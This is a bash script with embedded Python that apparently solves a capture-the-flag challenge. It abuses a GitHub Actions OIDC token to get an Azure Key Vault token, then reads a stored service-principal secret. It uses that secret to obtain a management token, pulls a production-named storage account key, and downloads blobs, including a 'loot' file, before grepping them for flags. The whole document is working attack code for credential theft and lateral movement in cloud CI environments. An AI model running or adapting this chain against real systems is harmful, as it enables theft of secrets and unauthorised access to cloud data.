#!/usr/bin/env bash
set -uo pipefail
python3 - <<'PYEOF'
import os, json, urllib.request, urllib.parse
def http(url, data=None, headers=None, method=None):
    h=dict(headers or {}); body=None
    if isinstance(data, dict):
        body=urllib.parse.urlencode(data).encode(); h.setdefault("Content-Type","application/x-www-form-urlencoded")
    elif data==b"": body=b""; h.setdefault("Content-Length","0")
    req=urllib.request.Request(url, data=body, headers=h, method=method)
    try:
        with urllib.request.urlopen(req, timeout=40) as r: return r.status, r.read()
    except urllib.error.HTTPError as e: return e.code, e.read()
    except Exception as e: return 0, str(e).encode()
def jg(b):
    try: return json.loads(b)
    except Exception: return {}
TEN=os.environ["AZURE_TENANT_ID"]; CID=os.environ["AZURE_CLIENT_ID"]; SUB=os.environ["AZURE_SUBSCRIPTION_ID"]
st,b=http(os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]+"&audience=api://AzureADTokenExchange",
          headers={"Authorization":"bearer "+os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]})
IDT=json.loads(b)["value"]
st,b=http(f"https://login.microsoftonline.com/{TEN}/oauth2/v2.0/token",{"client_id":CID,
  "scope":"https://vault.azure.net/.default","grant_type":"client_credentials",
  "client_assertion_type":"urn:ietf:params:oauth:client-assertion-type:jwt-bearer","client_assertion":IDT})
KVT=jg(b)["access_token"]
st,b=http("https://kv-tbl-prod-x3euoz.vault.azure.net/secrets/sync-service-principal?api-version=7.4",
          headers={"Authorization":"Bearer "+KVT})
c=json.loads(jg(b)["value"])
st,b=http(f"https://login.microsoftonline.com/{c.get('tenantId',TEN)}/oauth2/v2.0/token",
  {"client_id":c["appId"],"client_secret":c["clientSecret"],
   "scope":"https://management.azure.com/.default","grant_type":"client_credentials"})
ARM=jg(b)["access_token"]
st,b=http(f"https://management.azure.com/subscriptions/{SUB}/resourceGroups/rg-tbl-platform-prod-sea/"
          f"providers/Microsoft.Storage/storageAccounts/sttblcilogsprodx3euoz/listKeys?api-version=2023-01-01",
          data=b"", headers={"Authorization":"Bearer "+ARM}, method="POST")
open("/tmp/stkey","w").write(jg(b)["keys"][0]["value"])
PYEOF

KEY=$(cat /tmp/stkey); ACCT=sttblcilogsprodx3euoz
mkdir -p /tmp/dl && cd /tmp/dl
for SPEC in "logs:build-2024.log" "logs:zdep2.zip" "loot:mi_loot_latest.json"; do
  C="${SPEC%%:*}"; B="${SPEC##*:}"
  az storage blob download -c "$C" -n "$B" --account-name "$ACCT" --account-key "$KEY" -f "/tmp/dl/$B" --overwrite -o none 2>&1 | head -3
  echo "--- $C/$B : $(stat -c%s "/tmp/dl/$B" 2>/dev/null) bytes, $(file -b "/tmp/dl/$B" 2>/dev/null)"
done

echo
echo "=== flag grep over everything downloaded ==="
grep -raoiE '(DF26|flag|CTF|cyberjutsu)\{[^}]{0,200}\}' /tmp/dl 2>/dev/null | sort -u | head -20

echo
echo "=== zdep2.zip ==="
cd /tmp/dl && unzip -o -q zdep2.zip -d /tmp/dl/z 2>&1 | head -5
find /tmp/dl/z -type f 2>/dev/null | head -40
grep -raoiE '(DF26|flag|CTF|cyberjutsu)\{[^}]{0,200}\}' /tmp/dl/z 2>/dev/null | sort -u | head -20

echo
echo "=== build-2024.log (first 120 lines) ==="
head -120 /tmp/dl/build-2024.log 2>/dev/null

rm -f /tmp/stkey
echo "=== done ==="